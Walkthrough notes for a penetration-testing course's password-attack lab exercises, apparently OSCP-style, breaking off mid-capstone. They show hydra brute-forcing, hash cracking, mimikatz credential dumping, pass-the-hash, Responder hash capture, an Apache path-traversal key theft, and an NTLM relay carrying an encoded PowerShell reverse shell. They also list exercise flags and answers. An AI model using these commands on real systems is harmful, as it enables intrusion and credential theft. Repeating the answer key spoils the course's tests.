
# 15.1.1 Network Services


1. Follow the steps outlined in this section to leverage a dictionary attack to get access to SSH (port 2222) on VM #1 (BRUTE). Find the flag in the _george_ user's home directory.

```bash
# Enumerate
sudo nmap -Pn 192.168.241.201
	PORT     STATE SERVICE
	22/tcp   open  ssh
	2222/tcp open  EtherNetIP-1

sudo nmap -sV 192.168.241.201
	PORT     STATE SERVICE VERSION
	2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# Use hydra
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.241.201
	[2222][ssh] host: 192.168.241.201   login: george   password: chocolate

# Login
ssh george@192.168.241.201 -p 2222
	password:   chocolate
```

> Answer:  OS{5042809f26d448f022f68490b351794d}



2. Follow the steps outlined in this section to leverage a dictionary attack to gain access to RDP on VM #2 (BRUTE2). Find the flag on either one of the user's desktops. To reduce the time it takes to perform the password spraying, you can create a list with the two usernames _justin_ and _daniel_.

```bash
# Enumerate
sudo -Pn 192.168.241.202
	PORT     STATE SERVICE
	21/tcp   open  ftp
	135/tcp  open  msrpc
	139/tcp  open  netbios-ssn
	445/tcp  open  microsoft-ds
	3389/tcp open  ms-wbt-server
	8000/tcp open  http-alt

# Password spray attack
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.241.202
	[3389][rdp] host: 192.168.241.202   login: justin   password: SuperS3cure1337#
	[3389][rdp] host: 192.168.241.202   login: daniel   password: SuperS3cure1337#

# Login
rdesktop 192.168.241.202 -u justin -p SuperS3cure1337#
```

> Answer:  OS{6527425c127b4b1f5938d30c9187ecff}



3. Enumerate VM #3 (BRUTE2) and find another network service. Use the knowledge from this section to get access as the _itadmin_ user and find the flag.

```bash
# Enumerate
sudo nmap -Pn 192.168.241.202
	PORT     STATE SERVICE
	21/tcp   open  ftp
	135/tcp  open  msrpc
	139/tcp  open  netbios-ssn
	445/tcp  open  microsoft-ds
	3389/tcp open  ms-wbt-server
	8000/tcp open  http-alt

# Attack
hydra ftp://192.168.241.202 -l itadmin -P /usr/share/wordlists/rockyou.txt
	[21][ftp] host: 192.168.241.202   login: itadmin   password: hellokitty

# Connect to ftp
ftp 192.168.241.202                                                             
	Connected to 192.168.241.202.
	220-FileZilla Server 1.4.1
	220 Please visit https://filezilla-project.org/
Name (192.168.241.202:kali): itadmin
	331 Please, specify the password.
Password: 
	230 Login successful.
	Remote system type is UNIX.
	Using binary mode to transfer files.
ftp> ls
	229 Entering Extended Passive Mode (|||52238|)
	150 Starting data transfer.
	-rw-rw-rw- 1 ftp ftp             282 Jun 09  2022 desktop.ini
	-rw-rw-rw- 1 ftp ftp              38 Mar 30 06:01 flag.txt
	226 Operation successful
ftp> get flag.txt
ftp> exit

cat flag.txt
```

> Answer:  OS{df4abd9eb8e51b1ce81dcbc9635535d4}


# 15.1.2 HTTP Post

2. The web page on VM #2 is password protected. Use Hydra to perform a password attack and get access as user _admin_. Once you have identified the correct password, enter it as answer to this exercise.

```bash
# Enumerate
sudo nmap -Pn 192.168.227.201
	PORT   STATE SERVICE REASON
	22/tcp open  ssh     syn-ack ttl 61
	80/tcp open  http    syn-ack ttl 60
```

- Open Burp and turn proxy on
- Navigate to site
- Login user:pass
- Take note of request body and failed login identifier
![](15.1.2.2ex_http_invalid.png)

- As it's only a GET request, research how to use **hydra's** http-get for Basic Authentication
- https://notes.benheater.com/books/hydra/page/brute-force-http-basic-authentication-with-hydra
```bash
hydra -U http-get
	Help for module http-get:
	============================================================================
	Module http-get requires the page to authenticate.
	The following parameters are optional:
	 (a|A)=auth-type   specify authentication mechanism to use: BASIC, NTLM or MD5
	 (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
	 (F|S)=check for text in the HTTP reply. S= means if this text is found, a
	       valid account has been found, F= means if this string is present the
	       combination is invalid. Note: this must be the last option supplied.
	For example:  "/secret" or "http://bla.com/foo/bar:H=Cookie\: sessid=aaaa" or "https://test.com:8080/members:A=NTLM"
```

- Craft attack
```bash
hydra -I -l admin -P /usr/share/wordlists/rockyou.txt "http-get://192.168.227.201:80/:A=BASIC:F=401"
	[80][http-get] host: 192.168.227.201   login: admin   password: 789456]
```

> Answer:  789456



# 15.2.4 Password Manager

2. Enumerate VM #2 and get access to the system as user _nadine_. Obtain the password stored as title "flag" in the password manager.
```bash
# Enumerate
sudo nmap -Pn -vv -n -p- 192.168.212.227 --max-scan-delay=0 
	PORT      STATE SERVICE       REASON
	135/tcp   open  msrpc         syn-ack ttl 125
	139/tcp   open  netbios-ssn   syn-ack ttl 125
	445/tcp   open  microsoft-ds  syn-ack ttl 125
	3389/tcp  open  ms-wbt-server syn-ack ttl 125
	5040/tcp  open  unknown       syn-ack ttl 125
	49664/tcp open  unknown       syn-ack ttl 125
	49665/tcp open  unknown       syn-ack ttl 125
	49666/tcp open  unknown       syn-ack ttl 125
	49667/tcp open  unknown       syn-ack ttl 125
	49668/tcp open  unknown       syn-ack ttl 125
	49669/tcp open  unknown       syn-ack ttl 125
	49670/tcp open  unknown       syn-ack ttl 125
	49671/tcp open  unknown       syn-ack ttl 125

sudo nmap -sCV -p 135,139,445,3389,5040,49664,49665,49666,49667,49668,49669,49670,49671 192.168.212.227
	PORT      STATE SERVICE            VERSION
	135/tcp   open  msrpc              Microsoft Windows RPC
	139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
	445/tcp   open  microsoft-ds?
	3389/tcp  open  ssl/ms-wbt-server?
	| rdp-ntlm-info: 
	|   Target_Name: MARKETINGWK02
	|   NetBIOS_Domain_Name: MARKETINGWK02
	|   NetBIOS_Computer_Name: MARKETINGWK02
	|   DNS_Domain_Name: marketingwk02
	|   DNS_Computer_Name: marketingwk02
	|   Product_Version: 10.0.22000
	|_  System_Time: 2024-04-01T22:19:08+00:00
	|_ssl-date: 2024-04-01T22:19:23+00:00; +1s from scanner time.
	| ssl-cert: Subject: commonName=marketingwk02
	| Not valid before: 2024-03-31T22:09:20
	|_Not valid after:  2024-09-30T22:09:20
	5040/tcp  open  unknown
	49664/tcp open  msrpc              Microsoft Windows RPC
	49665/tcp open  msrpc              Microsoft Windows RPC
	49666/tcp open  msrpc              Microsoft Windows RPC
	49667/tcp open  msrpc              Microsoft Windows RPC
	49668/tcp open  msrpc              Microsoft Windows RPC
	49669/tcp open  msrpc              Microsoft Windows RPC
	49670/tcp open  msrpc              Microsoft Windows RPC
	49671/tcp open  msrpc              Microsoft Windows RPC
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
	
	Host script results:
	| smb2-time: 
	|   date: 2024-04-01T22:19:13
	|_  start_date: N/A
	| smb2-security-mode: 
	|   3:1:1: 
	|_    Message signing enabled but not required
```

- Attack RDP
```bash
hydra -l nadine -P /usr/share/wordlists/rockyou.txt rdp://192.168.212.227
	[3389][rdp] host: 192.168.212.227   login: nadine   password: 123abc

# Login
xfreerdp /cert-ignore /compression /auto-reconnect /u:nadine /p:123abc /v:192.168.212.227 /drive:test,/home/kali/exercises/ 
```

- Check for KeePass (it's there)
- Find DB file
```powershell
C:\>dir /s *.kdbx
	 Volume in drive C has no label.
	 Volume Serial Number is 1682-A2A3
	
	 Directory of C:\Users\nadine\Documents
	
	06/09/2022  10:39 AM             1,966 Database.kdbx
	               1 File(s)          1,966 bytes
	
	     Total Files Listed:
	               1 File(s)          1,966 bytes
	               0 Dir(s)   1,184,964,608 bytes free
```

- Transfer *Database.kdbx* file to Kali & crack
```bash
keepass2john Database.kdbx > keepass.hash

# Remove prepend of 'Database:'
vim keepass.hash

cat keepass.hash
	$keepass$*2*1*0*b1a85c5029830d00eead372eff9b2c0c5f2b78d8adf6090568429ba7b9622f25*27ab0d96aaacbb427dc6e9746fcf5148a468d042855186d3d1409d40ca018fa1*2eb108ae671a4aebcfa4217b5dcdccdc*ea47adcf48185eb7d670b25a3b2f8a535eb72339bbdf2e0d05c892bad22287f0*e250173255fbe9861707502ebef385c839fd328dac2f7874ff3b0bfc13cf4b56

# Crack
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule
	$keepass$*2*1*0*b1a85c5029830d00eead372eff9b2c0c5f2b78d8adf6090568429ba7b9622f25*27ab0d96aaacbb427dc6e9746fcf5148a468d042855186d3d1409d40ca018fa1*2eb108ae671a4aebcfa4217b5dcdccdc*ea47adcf48185eb7d670b25a3b2f8a535eb72339bbdf2e0d05c892bad22287f0*e250173255fbe9861707502ebef385c839fd328dac2f7874ff3b0bfc13cf4b56:pinkpanther1234
```

- Use `pinkpanther1234` for KeePass Master Password & get flag

> Answer:  `eSGJIzUp5nrr834QZBWK`



# 15.2.5 SSH Private Key Passphrase

2. Enumerate VM #2 and find a way to get access to SSH on port 2222. Find the flag of the user you used for the SSH connection.
   You can use the same rules we created in this section.

```bash
# Enumerate
sudo nmap -Pn -n -vv --max-scan-delay=0 192.168.243.201
	PORT     STATE SERVICE      REASON
	22/tcp   open  ssh          syn-ack ttl 61
	80/tcp   open  http         syn-ack ttl 60
	2222/tcp open  EtherNetIP-1 syn-ack ttl 60

sudo nmap -sCV 192.168.243.201 -p 22,80,2222         
	PORT     STATE SERVICE VERSION
	22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   256 d1:1d:d5:a0:66:7e:28:4c:eb:cd:8b:80:5d:af:70:08 (ECDSA)
	|_  256 72:9b:a5:49:10:7b:e9:c5:5f:9e:fe:47:50:a8:74:df (ED25519)
	80/tcp   open  http    Apache httpd 2.4.49 ((Unix))                               <--Note Apache version 2.4.49
	| http-methods: 
	|_  Potentially risky methods: TRACE
	|_http-title: Rebuilding..
	|_http-server-header: Apache/2.4.49 (Unix)
	2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   3072 a0:11:3a:9a:ba:e9:e7:de:a9:d0:f3:57:90:67:03:7f (RSA)
	|   256 93:84:c4:1e:e5:41:51:a4:ab:68:ca:f6:03:f7:47:43 (ECDSA)
	|_  256 39:21:bd:51:89:5d:2e:26:14:2b:0f:e0:73:2b:01:5f (ED25519)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


gobuster dir -u http://192.168.243.201 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
	<no results>
```

- Navigating to the page doesn't yield much, until we look at it via Dev Tools
![](15.2.5ex_pwuser.png)
- Found user 'alfred'

As we're working with Apache 2.4.49, we've already seen an exploit for it.
- Download and use exploit for Apache version
```bash
# Search for and download exploit
searchsploit apache 2.4.49
	...
	Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)                | multiple/webapps/50383.sh
	...

searchsploit -m 50383

# Review code & understand it
echo "192.168.243.201" > targets.txt

./50383.sh targets.txt /home/alfred/.ssh/id_rsa > id_rsaQ2    <--- NOTE Appending Q2 to delineate chapter content from exercise content

# Remove first line
vim id_rsaQ2
cat id_rsaQ2
	-----BEGIN OPENSSH PRIVATE KEY-----
	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
	tG9DRw==
	-----END OPENSSH PRIVATE KEY-----

```

- Get the ssh hash
```bash
ssh2john id_rsaQ2 > sshQ2.hash

# "\$6\$" = SHA-512.1
cat sshQ2.hash
	id_rsaQ2:$sshng$6$16$1b61d397f6104f61abf8ddfc60284cf4$1894$6f7....
```
- Remove the filename and colon before the first *$*

- Determine hashcat's hash type
```bash
hashcat -h | grep -i "ssh"
	22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)                      | Private Key
```

- Use John's and previous rules to crack
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=sshRules sshQ2.hash
	Superstar137!    (?)
```

- Login & get flag
```bash
ssh -i id_rsaQ2 -p 2222 alfred@192.168.243.201
	# password > Superstar137!

ls
	123_flag.txt
cat 123_flag.txt 
	OS{c0c14644e70e9f64f988edb2c17ac237}
```

> Answer:  OS{c0c14644e70e9f64f988edb2c17ac237}



# 15.3 Password Hashes

### Cracking NTLM

2. Access VM #2 via RDP as user _nadine_ with the password retrieved in the exercise of the section labelled "Password Manager" and leverage the methods from this section to extract the NTLM hash of the user _steve_. Use **best64.rule** for the cracking process and enter the plain text password as answer to this exercise

- Password is *123abc*
```bash
# RDP nadine:123abc
xfreerdp /cert-ignore /compression /auto-reconnect /u:nadine /p:123abc /v:192.168.201.227
```

```powershell
# Enumerate local users
Get-LocalUser
	Name               Enabled Description
	----               ------- -----------
	Administrator      False   Built-in account for administering the computer/domain
	DefaultAccount     False   A user account managed by the system.
	Guest              False   Built-in account for guest access to the computer/domain
	nadine             True
	offsec             True
	steve              True

# Use mimikatz to extract hash
cd C:\Tools
.\mimikatz.exe

mimikatz # privilege::debug
	Privilege '20' OK

mimikatz # token::elevate
	Token Id  : 0
	User name :
	SID name  : NT AUTHORITY\SYSTEM
	
	656     {0;000003e7} 1 D 40813          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
	 -> Impersonated !

mimikatz # lsadump::sam
	RID  : 000003eb (1003)
	User : steve
	  Hash NTLM: 2835573fb334e3696ef62a00e5cf7571
```

```bash
# Copy to kali
echo 2835573fb334e3696ef62a00e5cf7571 > steve.hash

# Crack
hashcat -m 1000 steve.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
	2835573fb334e3696ef62a00e5cf7571:francesca77

# Test by RDP'ing in as steve:francesca77
```


### Passing-the-Hash

1. Use the methods from this section to get access to VM #2 and find the flag on the desktop of the user _Administrator_.

- Grab NTLM hash of Administrator
```powershell
cd C:\Tools
.\mimikatz.exe

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
	...
	-> Impersonated !

mimikatz # lsadump::sam
	Domain : FILES01
	SysKey : 509cc0c46295a3eaf4c5c8eb6bf95db1
	Local SID : S-1-5-21-1555802299-1328189896-734683769
	
	SAMKey : 201b0e3078f2be635aaaa055ab5a7828

	RID  : 000001f4 (500)
	User : Administrator
	  Hash NTLM: 7a38310ea6f0027ee955abed1762964b
	  
	RID  : 000003ef (1007)
	User : paul
	  Hash NTLM: 57373a907ccd7196a2bad219132d615f

	RID  : 000003f0 (1008)
	User : files02admin
  Hash NTLM: e78ca771aeb91ea70a6f1bb372c186b6
```

- Get interactive shell
```bash
impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.201.212

C:\Windows\System32>  type C:\Users\Administrator\Desktop\flag.txt
```


### Cracking Net-NTLMv2

1. Follow the steps outlined in this section to obtain the Net-NTLMv2 hash in Responder. Crack it and use it to connect to VM #1 (FILES01) with RDP.
   Find the flag on _paul's_ desktop. Attention: If the bind shell is terminated it may take up to 1 minute until it is accessible again.

- Connect to bind shell port 4444
```bash
nc 192.168.217.211 4444
```

- Verify which user is running the shell
- Check if user is a member of the local Admin group
```powershell
whoami
	files01\paul

net user paul
	net user paul
	User name                    paul
	Full Name                    paul power
	Comment                      
	User's comment               
	Country/region code          000 (System Default)
	Account active               Yes
	Account expires              Never
	
	Password last set            6/3/2022 10:57:06 AM
	Password expires             Never
	Password changeable          6/3/2022 10:57:06 AM
	Password required            Yes
	User may change password     Yes
	
	Workstations allowed         All
	Logon script                 
	User profile                 
	Home directory               
	Last logon                   4/10/2024 3:30:49 PM
	
	Logon hours allowed          All
	
	Local Group Memberships      *Remote Desktop Users *Users    <-NOTE               
	Global Group memberships     *None
```
	- User isn't member of Admin group (so no Mimikatz), but is member of RDP group


- Setup up Responder as an SMB server & use FILES01 (*192.168.217.211*) as the target
```bash
# Retrieve tun0 interface
ip a
	4: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
	    link/none 
	    inet 192.168.45.221/24 scope global tun0

# Start up Responder SMB share
#   Will list services.  Verify SMB is ON
sudo responder -I tun0
	...
	SMB server                 [ON]
	...
	[+] Listening for events...
```

- Connect to share from victim computer
```powershell
dir \\192.168.45.221\test
	Access is denied.
```

- Receive hash from Responder output
```bash
	[SMB] NTLMv2-SSP Client   : 192.168.217.211
	[SMB] NTLMv2-SSP Username : FILES01\paul
	[SMB] NTLMv2-SSP Hash     : paul::FILES01:be9ce4fce2939b3c:3D8714AD3935C477B7F4FAFD9FDB5EBF:010100000000000080DBD4DD758BDA0182598AB326C6F68A000000000200080035004E005200550001001E00570049004E002D005900570031004700310047005400590034003600320004003400570049004E002D00590057003100470031004700540059003400360032002E0035004E00520055002E004C004F00430041004C000300140035004E00520055002E004C004F00430041004C000500140035004E00520055002E004C004F00430041004C000700080080DBD4DD758BDA01060004000200000008003000300000000000000000000000002000004CE7A8BE68810A009AF25392AAC895F3BDDCA9C7559603D8F0B58A4661613A8C0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200320031000000000000000000
```

- Crack hash
```bash
# Add hash to file
echo "paul::FILES01:be9ce4fce2939b3c:3D8714AD3935C477B7F4FAFD9FDB5EBF:010100000000000080DBD4DD758BDA0182598AB326C6F68A000000000200080035004E005200550001001E00570049004E002D005900570031004700310047005400590034003600320004003400570049004E002D00590057003100470031004700540059003400360032002E0035004E00520055002E004C004F00430041004C000300140035004E00520055002E004C004F00430041004C000500140035004E00520055002E004C004F00430041004C000700080080DBD4DD758BDA01060004000200000008003000300000000000000000000000002000004CE7A8BE68810A009AF25392AAC895F3BDDCA9C7559603D8F0B58A4661613A8C0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200320031000000000000000000" > paul.hash

# Retrieve hashcat mode
hashcat -h | grep -i "ntlm"
   5600 | NetNTLMv2                                                  | Network Protocol

# Crack
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt
	...
	123Password123
     
	Session..........: hashcat
	Status...........: Cracked

# Connect via RDP
xfreerdp /cert-ignore /compression /auto-reconnect /u:paul /p:123Password123 /v:192.168.217.211
```


> Answer:  OS{2bbe322af29940e6f40246f5069323c4}




2. Enumerate VM #2 and find a way to obtain a Net-NTLMv2 hash via the web application.
   Important: Add **marketingwk01** to your **/etc/hosts** file with the corresponding IP address of the machine.
   After you have obtained the Net-NTLMv2 hash, crack it, and connect to the system to find the flag.

```bash
# Enumerate
nmap -Pn 192.168.178.210 
	PORT     STATE SERVICE
	135/tcp  open  msrpc
	139/tcp  open  netbios-ssn
	445/tcp  open  microsoft-ds
	3389/tcp open  ms-wbt-server
	8000/tcp open  http-alt

# Add to /etc/hosts
sudo echo "192.168.178.210 marketingwk01" >> /etc/hosts

# Start Responder
sudo responder -I tun0
```

- Open Burp & intercept file upload
![](15.3.3ex_upload.png)

- Send to Repeater; change `filename=" "` value to point to Responder's SMB share
![](15.3.3ex_repeater.png)

```bash
# Get hash output from Responder
[+] Listening for events...                                                                                               

	[SMB] NTLMv2-SSP Client   : 192.168.178.210
	[SMB] NTLMv2-SSP Username : MARKETINGWK01\sam
	[SMB] NTLMv2-SSP Hash     : sam::MARKETINGWK01:a1c9978191af4d3c:2EE3947F50A113E2B8C1627467133E92:01010000000000008075874CEB8CDA017D2759D8EB7A51970000000002000800470049005800340001001E00570049004E002D004F003000300036004E0037003600390043004100520004003400570049004E002D004F003000300036004E003700360039004300410052002E0047004900580034002E004C004F00430041004C000300140047004900580034002E004C004F00430041004C000500140047004900580034002E004C004F00430041004C00070008008075874CEB8CDA01060004000200000008003000300000000000000000000000002000006F644B0E22B3E4A8793FE43233EC77CB7F34C96DDFB13C01BB50071632F9F2EA0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200300036000000000000000000

# Create hash file
echo "sam::MARKETINGWK01:a1c9978191af4d3c:2EE3947F50A113E2B8C1627467133E92:01010000000000008075874CEB8CDA017D2759D8EB7A51970000000002000800470049005800340001001E00570049004E002D004F003000300036004E0037003600390043004100520004003400570049004E002D004F003000300036004E003700360039004300410052002E0047004900580034002E004C004F00430041004C000300140047004900580034002E004C004F00430041004C000500140047004900580034002E004C004F00430041004C00070008008075874CEB8CDA01060004000200000008003000300000000000000000000000002000006F644B0E22B3E4A8793FE43233EC77CB7F34C96DDFB13C01BB50071632F9F2EA0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200300036000000000000000000" > sam.hash

# Verify hash mode
hashcat -h | grep -i "ntlm"
   5600 | NetNTLMv2                                                  | Network Protocol

# Crack
hashcat -m 5600 sam.hash /usr/share/wordlists/rockyou.txt
	...DISISMYPASSWORD

# Connect to the system & grab flag
xfreerdp /cert-ignore /compression /auto-reconnect /u:sam /p:DISISMYPASSWORD /v:192.168.178.210 /drive:test,/home/kali/exercises/pw

# Flag's on the desktop
```


> Answer:  OS{36dd0554d9bd5619747662a3933c592a}



### Relay Attack Net-NTLMv2

1. Use the methods from this section to get access to VM #2 (FILES02 @ 192.168.178.212) of VM Group 1 and obtain the flag on the desktop of the user _files02admin_.
   If the bind shell on VM #1 (FILES01 @ 192.168.178.211) is terminated it may take up to 1 minute until it is accessible again.

- Create base64 encoded Powershell reverse shell oneliner port 4444 on www.revshells.com

```bash
# Tab 1: Start relay tool - No http server; Add support for SMB2; Target FILES02; With base64 encoded Powershell reverse shell oneliner
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.178.212 -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA2ACIALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

# Tab 2: Start nc listener
nc -nlvp 4444

# Tab 3: Connect to FILES01's bind shell
nc 192.168.178.211
```


> Answer:  OS{de179c2c6d67508f79699c13d85d840d}




2. **Capstone Exercise**: Find a way to obtain a Net-NTLMv2 hash from the user _anastasia_ via the web application on VM #3 (BRUTE2 @ 192.168.178.202) and relay it to VM #4 (FILES02 @ 192.168.178.212).

```bash
# Enumerate
sudo nmap -Pn 192.168.178.202
	PORT     STATE SERVICE
	21/tcp   open  ftp
	135/tcp  open  msrpc
	139/tcp  open  netbios-ssn
	445/tcp  open  microsoft-ds
	3389/tcp open  ms-wbt-server
	8000/tcp open  http-alt
```

- Retrieve two reverse shell payloads from www.revshells.com
```powershell
# Reverse shell port 4444 to submit to webapp & connect to BRUTE2 webserver
